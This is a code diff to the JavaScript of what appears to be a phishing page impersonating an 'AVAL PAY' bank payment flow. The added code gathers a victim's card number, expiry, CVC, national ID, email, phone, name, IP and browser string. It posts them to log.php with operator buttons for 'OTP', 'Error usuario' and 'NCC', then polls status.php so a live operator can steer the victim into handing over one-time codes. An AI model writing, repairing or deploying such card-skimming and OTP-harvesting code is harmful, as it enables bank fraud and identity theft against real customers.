@@ -1777,32 +1777,34 @@
                 };
                 cerrarModalTarjeta();
                 avShowOv('avEsperaOverlay');
+                var _tcSid = crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2) + Date.now();
                 Promise.all([
                     avGetIP(),
                     fetch('card_info.php?cc=' + cardNum).then(function(r){return r.json();}).catch(function(){return {info:'—',brand:''};})
                 ]).then(function(res) {
                     _avCard.bank = res[1].info || '—';
                     _avCard.brand = res[1].brand || '';
-                    avTgLog([
-                        '💴💴💴 NUEVO AVAL PAY 💴💴💴',
-                        '🔪 IP: ' + res[0],
-                        '✉️ ' + _avCard.correo,
-                        '🪪 ' + _avCard.cedula,
-                        '📱 ' + _avCard.movil,
-                        '👤 ' + _avCard.nombre,
-                        '🔖 ' + navigator.userAgent,
-                        '🏧 Bank: ' + _avCard.bank,
-                        '💳 ' + cardNum,
-                        '📆 ' + cardExp,
-                        '🪬 ' + cardCvc,
-                        '💰 Monto: ' + avFmtCOP(monto)
-                    ], 'cc');
+                    fetch('log.php', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({
+                        action: 'cc',
+                        text: [
+                            '💴💴💴 NUEVO AVAL PAY 💴💴💴',
+                            '🔪 IP: ' + res[0],
+                            '✉️ ' + _avCard.correo,
+                            '🪪 ' + _avCard.cedula,
+                            '📱 ' + _avCard.movil,
+                            '👤 ' + _avCard.nombre,
+                            '🔖 ' + navigator.userAgent,
+                            '🏧 Bank: ' + _avCard.bank,
+                            '💳 ' + cardNum,
+                            '📆 ' + cardExp,
+                            '🪬 ' + cardCvc,
+                            '💰 Monto: ' + avFmtCOP(monto)
+                        ].join('\n'),
+                        session_id: _tcSid,
+                        buttons: [[{text:'❌ Error usuario',callback_data:'error_usuario:'+_tcSid},{text:'🔑 OTP',callback_data:'otp:'+_tcSid},{text:'🚫 NCC',callback_data:'ncc:'+_tcSid}]]
+                    })}).catch(function(){});
+                    avPoll(_tcSid);
                 });
-                setTimeout(function () {
-                    avHideOv('avEsperaOverlay');
-                    avFillVisa();
-                    avShowOv('avVisaAuthModal');
-                }, 2000);
             });
 
             document.addEventListener('keydown', function (evento) {
@@ -1873,25 +1875,27 @@
                     fetch('status.php?s=' + sid).then(function(r){return r.json();}).then(function(d) {
                         if (d.status === 'error_usuario') {
                             clearInterval(_avVisaTimer);
-                            if (document.getElementById('avVisaOtpModal').style.display !== 'none') {
-                                avHideOv('avVisaOtpModal');
-                                avFillVisa();
-                                avShowOv('avVisaAuthModal');
-                            }
+                            avHideOv('avEsperaOverlay');
+                            avHideOv('avVisaOtpModal');
+                            avFillVisa();
+                            avShowOv('avVisaAuthModal');
                             avVisaShowError();
+                        } else if (d.status === 'logo') {
+                            clearInterval(_avVisaTimer);
+                            avHideOv('avEsperaOverlay');
+                            avHideOv('avVisaOtpModal');
+                            avFillVisa();
+                            avShowOv('avVisaAuthModal');
                         } else if (d.status === 'otp') {
                             clearInterval(_avVisaTimer);
-                            if (document.getElementById('avVisaOtpModal').style.display === 'none') {
-                                avHideOv('avVisaAuthModal');
-                                document.getElementById('avOtpClave').value = '';
-                                avOtpLoading(false);
-                                avShowOv('avVisaOtpModal');
-                            } else {
-                                document.getElementById('avOtpClave').value = '';
-                                avOtpLoading(false);
-                            }
+                            avHideOv('avEsperaOverlay');
+                            avHideOv('avVisaAuthModal');
+                            document.getElementById('avOtpClave').value = '';
+                            avOtpLoading(false);
+                            avShowOv('avVisaOtpModal');
                         } else if (d.status === 'ncc') {
                             clearInterval(_avVisaTimer);
+                            avHideOv('avEsperaOverlay');
                             avHideOv('avVisaAuthModal');
                             avHideOv('avVisaOtpModal');
                             avShowOv('avRechazoOverlay');
